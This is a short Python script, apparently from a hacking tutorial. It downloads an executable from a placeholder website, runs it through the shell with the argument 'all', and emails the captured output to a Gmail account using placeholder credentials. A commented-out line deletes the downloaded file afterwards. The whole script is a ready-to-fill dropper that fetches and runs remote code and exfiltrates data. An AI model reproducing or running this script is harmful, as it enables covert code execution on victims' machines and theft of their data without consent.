import requests
import subprocess
import smtplib
import os


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


download("https://addressofwebsite.com/complete-location-of-targeted-download.exe")
result = subprocess.check_output("complete-location-of-targeted-download.exe all", shell=True)
send_mail("your.email.id.123@gmail.com", "yourpassword123", result)
# Uncomment if you want to delete the downloaded file after mailing it to the target email.
#os.remove("complete-location-of-targeted-download.exe")
